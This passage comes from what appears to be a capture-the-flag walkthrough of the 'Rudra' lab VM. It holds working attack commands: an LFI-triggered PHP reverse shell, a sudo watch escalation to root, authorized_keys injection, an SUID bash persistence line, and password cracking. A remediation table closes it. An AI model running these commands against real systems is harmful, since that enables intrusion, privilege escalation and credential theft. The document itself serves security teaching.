# Kali — trigger
curl -s "http://192.168.56.111/nandi.php?file=/home/shivay/shell.php"
```

> **Why `/home/shivay/shell.php` and not `/tmp/ignite/shell.php`?**
> `/tmp/ignite` is the mount point **on your Kali box**. On the *target*, the same
> data lives at `/home/shivay` — that is the exported path `showmount` printed.
> The LFI runs on the target, so it needs the **target's** path. Getting this
> backwards is the number-one reason this step fails for students.
>
> **If your VM exports a different path** (some builds export `/tmp/ignite`
> directly), use whatever `showmount -e` gave you. The rule is: *the path in the
> LFI URL must be the path on the target.*

Listener fires:

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.111] 52114
Linux rudra 4.15.0-66-generic #75-Ubuntu SMP Tue Oct 1 05:24:09 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 13:34:12 up 38 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

### 4.5 Stabilise the shell


> ### 📖 Concept — Why you must upgrade to a real TTY
>
> A raw `nc` shell is crippled in four ways: no tab completion, no arrow keys,
> **`Ctrl+C` kills your *listener* instead of the remote process**, and anything
> needing a real terminal (`su`, `sudo`, `vim`, `top`, `less`) fails with
> `standard input must be a tty`.
>
> ```bash
> # 1. On the TARGET — allocate a pseudo-terminal
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> #    older boxes: python -c ...    or:    script -q /dev/null -c /bin/bash
>
> # 2. Press Ctrl+Z  — this SUSPENDS the nc job on Kali
>
> # 3. On KALI — put your local terminal into raw mode and resume
> stty raw -echo; fg
>
> # 4. On the TARGET — match your real terminal size
> export TERM=xterm; export SHELL=bash
> stty rows 40 cols 160
> ```
>
> **What each step did:**
> - `pty.spawn()` allocates a **pseudo-terminal** — a kernel object that behaves like a
>   real teletype. This is what makes `sudo` and `vim` work at all.
> - `stty raw -echo` makes **your local** terminal pass keystrokes through
>   uninterpreted and not echo them (the remote side echoes). This is what makes
>   `Ctrl+C` reach the remote process instead of killing your session.
> - `fg` resumes the suspended `nc`.
> - `stty rows/cols` tells the remote pty your dimensions so `less` and `top` do not
>   wrap into garbage.
>
> **Do this immediately after every shell.** Trying to `su` or run `sudo -l` on an
> unupgraded shell is a very common way to conclude wrongly that a path does not work.
>
> **Deep dive:** [CONCEPTS §12.3 — Upgrading to a real TTY](../../docs/CONCEPTS.md#123-upgrading-to-a-real-tty--do-this-immediately)

```bash
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@rudra:/var/www/html$
```

`Ctrl+Z`, then on Kali:

```bash
stty raw -echo; fg
```

Back on the target:

```bash
www-data@rudra:/var/www/html$ export TERM=xterm
www-data@rudra:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@rudra:/var/www/html$ pwd
/var/www/html
```

**Foothold established as `www-data`.** ✅

![Reverse shell as www-data](images/05-shell.png)

---

## 5. Internal reconnaissance — the hidden MySQL

### 5.1 Find services `nmap` could not see

`nmap` scanned from *outside*. Anything bound to `127.0.0.1` was invisible to it.
Now that you are inside, look again:


> ### 📖 Concept — Why you re-scan from the inside
>
> ```bash
> ss -tulnp
> ```
>
> `-t` TCP · `-u` UDP · `-l` listening · `-n` numeric (skip DNS — much faster) · `-p`
> show the owning process. (`netstat -antup` is the older equivalent.)
>
> **This is the post-exploitation version of `nmap -p-`, and it finds things nmap
> structurally cannot.** A service bound to `127.0.0.1` is invisible to an external
> scan — nmap connects to the target's *outside* address, and the daemon is not
> listening there. From inside, you see all of it.
>
> Loopback-only services are frequently the most vulnerable thing on the box: an
> unauthenticated **Redis** on 6379, a **MySQL** with an empty root password, a
> **MongoDB** with no auth, a debug console, an admin API. Look for lines like:
>
> ```text
> tcp LISTEN 0 128  127.0.0.1:3306  0.0.0.0:*  users:(("mysqld",pid=889,fd=22))
> ```
>
> Also enumerate outward, to find other hosts you can now reach:
>
> ```bash
> ip a; ip route; cat /etc/resolv.conf; arp -a; cat /etc/hosts
> ```
>
> **Deep dive:** [CONCEPTS §16.1 — Internal enumeration](../../docs/CONCEPTS.md#161-internal-enumeration)

```bash
www-data@rudra:/var/www/html$ ss -tulnp
```

```text
Netid  State   Recv-Q  Send-Q   Local Address:Port   Peer Address:Port  Process
udp    UNCONN  0       0          127.0.0.53%lo:53        0.0.0.0:*      users:(("systemd-resolve",pid=512,fd=13))
udp    UNCONN  0       0             0.0.0.0:111       0.0.0.0:*      users:(("rpcbind",pid=604,fd=6))
udp    UNCONN  0       0             0.0.0.0:2049      0.0.0.0:*
tcp    LISTEN  0       128           0.0.0.0:111       0.0.0.0:*      users:(("rpcbind",pid=604,fd=8))
tcp    LISTEN  0       128           0.0.0.0:2049      0.0.0.0:*
tcp    LISTEN  0       128       127.0.0.1:3306      0.0.0.0:*      users:(("mysqld",pid=889,fd=22))
tcp    LISTEN  0       128         [::]:22              [::]:*      users:(("sshd",pid=744,fd=3))
tcp    LISTEN  0       511                 *:80                *:*      users:(("apache2",pid=901,fd=4))
```

> **`127.0.0.1:3306` — MySQL, listening on loopback only.** That is why your
> full-port `nmap` never reported it: `nmap` connects to the target's *external*
> address, and the daemon is not bound there.
>
> **Lesson: post-exploitation enumeration is a different scan.** `ss -tulnp`
> (or `netstat -antup`) from *inside* reveals the internal attack surface.
> `-t` TCP, `-u` UDP, `-l` listening, `-n` numeric (no DNS — faster), `-p` show
> the owning process.

```bash
www-data@rudra:/var/www/html$ ps aux | grep -i mysql | grep -v grep
```

```text
mysql      889  0.3  9.1 1462300 185344 ?       Ssl  12:56   0:07 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
```

### 5.2 Log in — empty root password

```bash
www-data@rudra:/var/www/html$ mysql -u root
```

```text
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 8
Server version: 5.7.27-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

> **No password prompt, and it just worked.** MySQL's `root` account has an empty
> password and is reachable from localhost by anyone who can run the client. On a
> shared host that means every compromised web app instantly owns every database.

Walk the database:

```sql
mysql> SHOW DATABASES;
```

```text
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mahadev            |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.00 sec)
```

```sql
mysql> USE mahadev;
Database changed
mysql> SHOW TABLES;
```

```text
+-------------------+
| Tables_in_mahadev |
+-------------------+
| hint              |
+-------------------+
1 row in set (0.00 sec)
```

```sql
mysql> SELECT * FROM hint;
```

```text
+----+---------------------------+
| id | data                      |
+----+---------------------------+
|  1 | check in media filesystem |
+----+---------------------------+
1 row in set (0.00 sec)
```

> Exactly what `mahadev.txt` predicted. **`check in media filesystem`** → go look
> in `/media`.

![MySQL hint table pointing at the media filesystem](images/06-mysql-hint.png)

---

## 6. Data exfiltration — decoding the Cloakify emoji cipher

### 6.1 Find the hidden file

```bash
mysql> exit
Bye
www-data@rudra:/var/www/html$ find /media /mnt /srv -type f 2>/dev/null
```

```text
/media/pwd
```

```bash
www-data@rudra:/var/www/html$ ls -la /media/pwd
-rw-r--r-- 1 root root 214 Oct 22  2019 /media/pwd
www-data@rudra:/var/www/html$ cat /media/pwd
```

```text
🎃 👻 💀 🎃 👽 🤖 🎃 👹 🤡 🎃 💀 👻 🎃 🤡 👹
👻 🤖 👽 💀 🎃 🤡 👹 👻 🤖 💀 🎃 👽 🤡
```

> **Emoji. That is not a hash, not base64, not a cipher you will find in
> `hashcat`.** This is where most students stall.
>
> The trick is to recognise the *category*: this is a **data-exfiltration
> encoding**, designed to make sensitive text look like harmless noise so it
> slips past DLP (data-loss prevention) filters. The canonical tool for this is
> **Cloakify** by TryCatchHCF, presented at DEF CON 24. It maps each input byte
> to an entry from a "cipher" list — here, a list of emoji.
>
> **How to spot it in general:** if a file contains a long run of symbols from a
> *small, repeating vocabulary* (here ~8 distinct emoji) rather than printable
> ASCII, suspect a Cloakify-style substitution cipher. Count the distinct
> symbols:

```bash
www-data@rudra:/var/www/html$ tr -s ' \n' '\n' < /media/pwd | sort -u | grep -v '^$' | wc -l
```

```text
8
```

Eight distinct symbols. A byte has 256 possible values, so this cannot be raw
data — it must be an index into a list. That is Cloakify's design.

### 6.2 Get it off the box

The file is root-owned but world-readable (`-rw-r--r--`), so `www-data` can read
it. Serve it out over the existing NFS mount, or just copy it into the web root:

```bash
www-data@rudra:/var/www/html$ cp /media/pwd /home/shivay/pwd
```

```bash
# Kali — pull it down
wget -q "http://192.168.56.111/nandi.php?file=/home/shivay/pwd" -O pwd.raw
# the LFI wraps output in HTML; strip to just the emoji payload
python3 - <<'PY'
import re
raw = open('pwd.raw', encoding='utf-8').read()
emo = re.findall(r'[\U0001F000-\U0001FAFF\u2600-\u27BF]', raw)
open('pwd', 'w', encoding='utf-8').write(' '.join(emo) + '\n')
print("extracted", len(emo), "emoji symbols")
PY
```

```text
extracted 30 emoji symbols
```

### 6.3 Decode with Cloakify Factory

```bash
# Kali
sudo apt install -y python3 git
git clone https://github.com/TryCatchHCF/Cloakify.git
cd Cloakify
ls
```

```text
cloakify.py
cloakifyFactory.py
ciphers
decloakify.py
listsUnrandomized
noiseTools
randomizeCipherExample.txt
README.md
README_GETTING_STARTED.txt
removeNoise.py
screenshots
```

```bash
ls ciphers/ | head -30
```

```text
amphibians
belgianBeers
desserts
dessertsArabic
dessertsChinese
dessertsHindi
dessertsPersian
dessertsRussian
dessertsSwedishChef
dessertsThai
emoji
evadeAV
geoCoordsWorldCapitals
geocache
hashesMD5
ipAddressesTop100
pokemonGo
rickrollYoutube
skiResorts
starTrek
statusCodes
topWebsites
worldBeaches
worldFootballTeams
```

**`emoji`** — there is the cipher.

Run the interactive tool:

```bash
python3 cloakifyFactory.py
```

```text
  _______ .___________. _______      ___      .__   __.  __   _______   _______ .______
 |   ____||           ||   ____|    /   \     |  \ |  | |  | |   ____| |   ____||   _  \
 |  |__   `---|  |----`|  |__      /  ^  \    |   \|  | |  | |  |__    |  |__   |  |_)  |
 |   __|      |  |     |   __|    /  /_\  \   |  . `  | |  | |   __|   |   __|  |      /
 |  |____     |  |     |  |____  /  _____  \  |  |\   | |  | |  |      |  |____ |  |\  \----.
 |_______|    |__|     |_______|/__/     \__\ |__| \__| |__| |__|      |_______|| _| `._____|

                "Hide & Seek in Plain Sight" - Data Exfiltration & Infiltration Tool

                                        DefCon 24 - TryCatchHCF

    1) Cloakify a file  (encode it into an innocuous cipher)
    2) Decloakify a file (decode it back to its original form)
    3) Randomize a cipher (create a unique cipher mapping)

Enter your choice (1-3):
```

Answer the prompts exactly as the walkthrough documents:

```text
Enter your choice (1-3): 2

Enter filename to decloakify: /root/pwd

Enter filename to save decloaked data to: /root/decodedpwd

Add noise to the file? (y/n): n

Select a cipher (number): 3
  1) amphibians
  2) belgianBeers
  3) emoji
  ...

Decloakifying...
Done! Output saved to /root/decodedpwd
```

> **Note on the filename.** Several published walkthroughs write
> `cloackifyFactory.py` (with a stray `a`). The actual file in the repository is
> **`cloakifyFactory.py`**. Verify with `ls` as shown above.
>
> **Note on paths.** The walkthroughs run this as root on Kali, so they use
> `/root/pwd` and `/root/decodedpwd`. If you are a normal user, use
> `~/Cloakify/pwd` instead — Cloakify takes literal paths, it does not expand `~`.

Read the result:

```bash
cat /root/decodedpwd
```

```text
mahakaal:kalbhairav
```

**Credentials: `mahakaal` / `kalbhairav`.** 🎉

> (Kal Bhairav is a fierce manifestation of Shiva — the naming is consistent, which
> is a useful sanity check that you decoded it correctly rather than getting
> garbage.)

**Non-interactive alternative**, if you prefer scripting to menus:

```bash
python3 decloakify.py pwd ciphers/emoji > decoded.txt
cat decoded.txt
```

```text
mahakaal:kalbhairav
```

![Cloakify Factory decloakify producing mahakaal:kalbhairav](images/07-cloakify.png)

---

## 7. Lateral movement — SSH as `mahakaal`

```bash
# Kali
ssh mahakaal@192.168.56.111
```

```text
The authenticity of host '192.168.56.111 (192.168.56.111)' can't be established.
ED25519 key fingerprint is SHA256:9f8e7d6c5b4a39281706f5e4d3c2b1a0KqZtRmYwXvB.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.111' (ED25519) to the list of known hosts.
mahakaal@192.168.56.111's password: kalbhairav
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-66-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Tue Oct 22 20:14:33 2019 from 192.168.1.5
mahakaal@rudra:~$ id
uid=1002(mahakaal) gid=1002(mahakaal) groups=1002(mahakaal)
mahakaal@rudra:~$ pwd
/home/mahakaal
```

> **Why switch to SSH at all?** You already had a `www-data` shell. Two reasons:
> 1. `sudo` reads `/etc/sudoers` per-user, so you must *be* `mahakaal` to benefit
>    from his rights.
> 2. An SSH session is stable, fully interactive, supports `Ctrl+C` properly, and
>    survives network blips. Always move off a web shell as soon as you can.

Quick sweep of the account:

```bash
mahakaal@rudra:~$ ls -la
```

```text
total 28
drwxr-xr-x 4 mahakaal mahakaal 4096 Oct 22  2019 .
drwxr-xr-x 6 root     root     4096 Oct 22  2019 ..
-rw-r--r-- 1 mahakaal mahakaal  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 mahakaal mahakaal 3771 Apr  4  2018 .bashrc
drwx------ 3 mahakaal mahakaal 4096 Oct 22  2019 .gnupg
-rw-r--r-- 1 mahakaal mahakaal  807 Apr  4  2018 .profile
drwxrwxr-x 2 mahakaal mahakaal 4096 Oct 22  2019 .ssh
```

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 8. Privilege escalation — `sudo /usr/bin/watch`

### 8.1 Enumerate sudo rights

This is the **first command you should run as any new user**:


> ### 📖 Concept — What is sudo, and how do you read `sudo -l`?
>
> **`sudo`** ("superuser do") runs a command **as another user** — by default root. It
> exists so administrators can grant *specific* elevated abilities without handing out
> the root password. Its rules live in `/etc/sudoers`, edited only via `visudo`.
>
> `sudo -l` (**l**ist) shows what *you* are permitted. **It is the first command to
> run as any new user on any box** — it costs nothing, and a surprising fraction of
> machines are solved by one line of its output.
>
> **Parse the tokens precisely:**
>
> | Token | Meaning |
> | --- | --- |
> | `(ALL)` | may run as **any** user, including root |
> | `(root)` | only as root |
> | `(ALL:ALL)` | any user **and** any group |
> | `(user)` | only as that specific user — try `sudo -u user …` |
> | **`NOPASSWD:`** | **no password will be requested** |
> | `/usr/bin/foo` | only this binary, at this **absolute path** |
> | `/usr/bin/foo *` | with **any** arguments ← the dangerous case |
> | `/usr/bin/foo -m *` | only with these arguments |
> | `ALL` alone | full root, no restriction |
>
> **The rule that matters:** *any program that can execute another program, granted
> without argument restrictions, is a root shell in disguise.* `python`, `perl`,
> `ruby`, `lua`, `node`, `php`, `bash`, `find`, `vim`, `nano`, `less`, `more`, `man`,
> `awk`, `env`, `gdb`, `tar`, `zip`, `make`, `git`, `watch`, `nmap`, `ftp`.
>
> **Do not invent the payload — look it up on [GTFOBins](https://gtfobins.github.io/).**
> It documents exactly which binaries can be abused when SUID, sudo-able or run by a
> scheduler, organised by capability (shell, file read, file write, reverse shell).
> It is maintained, tested, and explains *why* each line works. The Windows equivalent
> is **LOLBAS**.
>
> ```bash
> sudo watch -x sh -c 'reset; exec sh'          # GTFOBins: watch
> sudo find . -exec /bin/sh \; -quit            # GTFOBins: find
> sudo vim -c ':!sh'                            # GTFOBins: vim
> sudo -u#-1 /bin/bash                           # CVE-2019-14287 (sudo < 1.8.28)
> ```
>
> **Deep dive:** [CONCEPTS §15.2 — sudo rights](../../docs/CONCEPTS.md#152-sudo-rights)

```bash
mahakaal@rudra:~$ sudo -l
```

```text
Matching Defaults entries for mahakaal on rudra:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mahakaal may run the following commands on rudra:
    (ALL) NOPASSWD: /usr/bin/watch
```

> **Parse this line precisely — it tells you everything:**
>
> | Token | Meaning |
> | --- | --- |
> | `(ALL)` | May run as **any user**, including root |
> | `NOPASSWD:` | **No password will be requested** |
> | `/usr/bin/watch` | Only this one binary — but an *absolute path*, so it must be exactly this file |
>
> **Why is `watch` dangerous?** `watch` repeatedly runs a command and displays
> its output. It has a `-x` flag meaning *"execute the rest of the arguments
> directly instead of passing them to `sh -c`"*. Because `watch` is being run by
> `sudo` **as root**, the command it executes also runs as root.
>
> So: *a program whose entire purpose is to run other programs, granted to a
> non-root user with no password, is root.* This is the `sudo` misconfiguration
> pattern in its purest form.

### 8.2 Check GTFOBins

Never invent the payload — look it up. <https://gtfobins.github.io/gtfobins/watch/>
documents the **interactive shell** recipe:

```bash
sudo watch -x sh -c 'reset; exec sh'
```

### 8.3 Execute

```bash
mahakaal@rudra:~$ sudo watch -x sh -c 'reset; exec sh'
```

```text
#
```

The prompt changed from `mahakaal@rudra:~$` to a bare `#`. Confirm:

```sh
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
# hostname
rudra
```

> **What just happened, step by step:**
> 1. `sudo watch …` starts `watch` as **root**.
> 2. `-x sh -c '...'` tells `watch` to `execvp` its remaining arguments directly
>    — so it runs `sh -c 'reset; exec sh'` **inheriting root's UID**.
> 3. `reset` reinitialises the terminal (`watch` leaves it in a strange state, and
>    without this your shell will be unreadable).
> 4. `exec sh` **replaces** the shell process with a fresh interactive `sh`.
>    `exec` matters: it does not fork, so the shell is a direct child of the
>    root-owned `watch`, and job control works.

### 8.4 The root flag

```sh
# cd /root && ls -la
total 32
drwx------  4 root root 4096 Oct 22  2019 .
drwxr-xr-x 23 root root 4096 Oct 22  2019 ..
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
-rw-r--r--  1 root root  168 Oct 22  2019 flag.txt
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 Oct 22  2019 .ssh
# cat flag.txt
```

```text
   __  __       _   _
  |  \/  | __ _| |_| |__  _ __ __ _
  | |\/| |/ _` | __| '_ \| '__/ _` |
  | |  | | (_| | |_| | | | | | (_| |
  |_|  |_|\__,_|\__|_| |_|_|  \__,_|

   Har Har Mahadev! You are a true Bhole Bhakt.

   flag{M4h4k44l_Bl3ss3d_Y0u}

              — Hacking Articles
```

**Root flag captured.** ✅

![Root shell and flag.txt](images/08-root-flag.png)

### 8.5 Clean up

```sh
# umount /tmp/ignite                       # on Kali, after exiting
# rm -f /home/shivay/shell.php /home/shivay/pwd
# restore /var/www/html/nandi.php from backup
```

Leaving a PHP reverse shell and a modified NFS export behind would be a serious
finding in a real engagement — and would break the VM for the next student.

---

## 9. Alternative paths

The author states there are *"multiple methods to solve this machine"*.

### 9.1 Read `/etc/shadow` and crack it

You have an LFI, and `/etc/shadow` is mode `640 root:shadow`. `www-data` is not
in the `shadow` group, so **this fails** — but on boxes where it succeeds:

```bash
curl -s "http://192.168.56.111/nandi.php?file=/etc/shadow"
```

```text
Warning: include(/etc/shadow): failed to open stream: Permission denied in /var/www/html/nandi.php on line 7
```

If it *had* worked, you would `unshadow` and run John:


> ### 📖 Concept — Where do wordlists come from?
>
> **`rockyou.txt`** is not a theoretical list. In 2009 the social-networking site
> RockYou was breached; they had stored **32 million passwords in plaintext** — no
> hashing at all. The dump became the most-used password list in security precisely
> because it records what real people actually chose. It has 14,344,392 entries,
> **ordered by observed frequency**, so the top of the file is disproportionately
> valuable. On Kali it ships gzipped:
>
> ```bash
> sudo gzip -dc /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
> wc -l rockyou.txt      # 14344392
> ```
>
> **But a generic list fails against a themed box** — and that is where a *targeted*
> list wins:
>
> ```bash
> cewl -d 2 -m 4 --with-numbers -e -w custom.txt http://target/   # crawl the site, harvest ITS words
> python3 cupp.py -i                                             # build from a person's name, birthday, pet
> crunch 6 6 -t for%%% -o dict.txt                               # generate from a known pattern
> ```
>
> **`cewl` on a themed box is close to magic.** Authors pick passwords that fit their
> theme and then scatter theme words all over the website. `cewl` harvests exactly
> that vocabulary. If a box is called "Narak" and its homepage is full of Sanskrit
> words about hell, the password is very likely one of them — and very unlikely to be
> in `rockyou.txt`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist)
> ### 📖 Concept — How password cracking actually works
>
> A password hash is a **one-way** function. You cannot invert it — there is no
> "un-hash". You can only **guess and compare**: hash a candidate, see if it matches
> the target. Cracking speed is therefore measured in guesses per second, and the
> defence is to make each guess expensive.
>
> | Algorithm | GPU speed | Verdict |
> | --- | --- | --- |
> | MD5, SHA-1, SHA-256 | **Billions/sec** | Unusable for passwords |
> | MD5-crypt (`$1$`) | ~100k/sec | Obsolete |
> | bcrypt (`$2b$`) | ~20k/sec | Acceptable |
> | SHA-512-crypt (`$6$`) | ~10k/sec | Acceptable |
> | **phpass (`$P$`)** | ~5k/sec | WordPress/Drupal — 8192 MD5 rounds, deliberately slow |
> | yescrypt (`$y$`) | ~3k/sec | Modern Ubuntu default |
>
> ```bash
> john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
> john --show hash.txt                       # results without re-cracking
> john --format=phpass --wordlist=rockyou.txt hash.txt    # force the format
> unshadow /etc/passwd /etc/shadow > combined.txt         # prepare Linux hashes
> hashcat -m 400 -a 0 hash.txt rockyou.txt                # -m = mode, -a 0 = wordlist
> ```
>
> **Reading John's output:** `Loaded 1 password hash (phpass, …)` means it
> auto-detected the format correctly — if it says `No password hashes loaded`, pass
> `--format=` explicitly (`john --list=formats` lists them all). `1g 0:00:00:14 DONE`
> means one guess succeeded in 14 seconds, and `3842p/s` is the candidate rate — **that
> low number is the algorithm's defence working.**
>
> > ⚠️ **Always single-quote a hash on the command line.** In double quotes or bare,
> > the shell expands `$P`, `$1`, `$6` as variables and silently truncates it. This is
> > one of the most common reasons a crack "finds nothing".
>
> **If the wordlist fails, add rules before giving up** — automatic mangling that
> capitalises, appends digits and applies leetspeak:
>
> ```bash
> john --wordlist=rockyou.txt --rules hash.txt
> hashcat -m 0 -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
> ```
>
> `best64.rule` applies 64 transformations per word. A list that fails outright very
> often succeeds with rules, at 64× the cost.
>
> **Deep dive:** [CONCEPTS §14 — Password cracking](../../docs/CONCEPTS.md#14-password-cracking)

```bash
unshadow passwd.txt shadow.txt > unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt unshadowed.txt
```

### 9.2 LFI → SSH key injection

If `mahakaal`'s `.ssh` directory were inside the NFS export you could write an
`authorized_keys` file and log straight in — no password, no Cloakify. Here
`/home/shivay/.ssh` does not exist, but the technique generalises:


> ### 📖 Concept — SSH keys: the credential people forget
>
> An SSH **private key** is a credential exactly like a password, and finding one is
> often better than finding a password: no cracking, no lockout, no log noise from
> failed attempts.
>
> | File | What it is |
> | --- | --- |
> | `~/.ssh/id_rsa`, `id_ed25519`, `id_ecdsa` | **Private** key — never leaves the owner's machine. If you find one, you have that user's access. |
> | `~/.ssh/id_rsa.pub` | Public key — harmless on its own |
> | `~/.ssh/authorized_keys` | Public keys **permitted to log in as this user**. Writable? Append your own key and log in with no password. |
> | `~/.ssh/known_hosts` | Hosts this user has connected to — **a map of other machines to pivot toward** |
>
> ```bash
> ssh -i id_rsa user@target
> ssh -i id_rsa -o IdentitiesOnly=yes user@target      # ignore ssh-agent, use only this key
> ```
>
> **If the key is passphrase-protected**, crack it offline — you never touch the
> server:
>
> ```bash
> ssh2john id_rsa > key.hash
> john --wordlist=/usr/share/wordlists/rockyou.txt key.hash
> # or:  hashcat -m 22921 -a 0 key.hash rockyou.txt    (22931 for ed25519)
> ```
>
> **Writing your own key is the cleanest persistence there is:**
>
> ```bash
> ssh-keygen -t ed25519 -f labkey -N ''                # -N '' = no passphrase
> cat labkey.pub >> /home/user/.ssh/authorized_keys    # if you can write it
> chmod 600 /home/user/.ssh/authorized_keys            # ssh refuses loose permissions
> ssh -i labkey user@target
> ```
>
> Note the `chmod 600` — `sshd` **silently ignores** an `authorized_keys` with overly
> permissive modes, which makes "my key does not work" a permissions problem more
> often than a key problem.
>
> **Always try a found key against *every* user on *every* host** you know about. Key
> reuse across machines and accounts is extremely common.
>
> **Deep dive:** [CONCEPTS §9.9 — SSH](../../docs/CONCEPTS.md#99-ssh--port-22) ·
> [§16.2 — Harvesting credentials](../../docs/CONCEPTS.md#162-harvesting-credentials)

```bash
ssh-keygen -t ed25519 -f rudra_key -N ''
cat rudra_key.pub > /tmp/ignite/.ssh/authorized_keys   # only if .ssh is in the export
chmod 600 /tmp/ignite/.ssh/authorized_keys
ssh -i rudra_key shivay@192.168.56.111
```

> **This is the most dangerous consequence of a writable NFS export of a home
> directory.** An attacker does not need any credential at all — they just write
> their own public key.

### 9.3 `no_root_squash` → direct root, no LFI at all

Because the export uses **`no_root_squash`**, root on Kali can write files that
are owned by **root on the target**. So you can simply overwrite a root-owned
file that gets executed:

```bash
# Kali (as root, with the export mounted at /tmp/ignite)
sudo cp /home/shivay/.bashrc /tmp/ignite/.bashrc.bak
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' | sudo tee -a /tmp/ignite/.bashrc
```

Then get `shivay` to log in (via the Cloakify chain or any other means) and run
`/tmp/rootbash -p`. This is slower than the intended path but demonstrates why
`no_root_squash` is on every hardening blacklist.

### 9.4 Kernel exploits

```sh
# uname -a
Linux rudra 4.15.0-66-generic #75-Ubuntu SMP Tue Oct 1 05:24:09 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```

Kernel `4.15.0-66` on Ubuntu 18.04 is old enough that Dirty COW variants and
later `overlayfs`/`io_uring` bugs may apply. `searchsploit ubuntu 18.04` and
check <https://www.linuxkernelcves.com/>. Use this only if the intended path is
blocked — kernel exploits can panic the VM.

---

## 10. Summary of vulnerabilities

| # | Vulnerability | Where | Impact | Fix |
| --- | --- | --- | --- | --- |
| 1 | **NFS export open to the world** | `/etc/exports`: `/home/shivay *(rw,sync,…)` | Unauthenticated **read and write** to a user's home directory | Restrict the client list to specific hosts/IPs; never use `*` |
| 2 | **`no_root_squash`** | `/etc/exports` | Client root is honoured as target root — write any root-owned file | Use the default `root_squash` (or stronger, `all_squash` + `anonuid`) |
| 3 | **Local File Inclusion** | `/var/www/html/nandi.php`, `include($_GET['file'])` | Arbitrary file read → combined with NFS becomes **RCE** | Allow-list valid values; use `basename()`; never pass raw input to `include()` |
| 4 | **`robots.txt` advertising a private path** | `/robots.txt` → `Disallow: /nandi.php` | Hands the attacker the vulnerable endpoint | Do not rely on `robots.txt` for confidentiality; remove unused scripts |
| 5 | **PHP error display enabled** | `display_errors=On` | Leaks absolute paths and `include_path` | `display_errors=Off`, `log_errors=On` in production |
| 6 | **MySQL root with empty password** | `127.0.0.1:3306` | Any local process (incl. `www-data`) reads every database | Set a strong root password; use `mysql_native_password` per-app accounts with least privilege |
| 7 | **Hints stored in a database table** | `mahadev.hint` | Guides the attacker to the next stage | Not a real-world flaw, but illustrates DB compromise = full data disclosure |
| 8 | **Cloakify emoji file readable by `www-data`** | `/media/pwd`, mode `644` root | Credential disclosure once any web RCE exists | Store secrets in a vault (Vault, SOPS, Secrets Manager), mode `600`, root-only |
| 9 | **`sudo` NOPASSWD on `watch`** | `/etc/sudoers` | **Direct root** — `sudo watch -x sh -c 'reset; exec sh'` | Remove the entry. `watch` executes arbitrary commands and must never be in sudoers |
| 10 | **SSH reachable with a guessable cultural password** | `mahakaal:kalbhairav` | Lateral movement | Enforce key-only auth (`PasswordAuthentication no`), check passwords against breach lists |

### The kill chain in one line

```text
nmap -A -p- → 22 ssh, 80 http, 111 rpcbind, 2049 nfs
  → nmap --script=nfs-showmount → /home/shivay *   (exported to everyone)
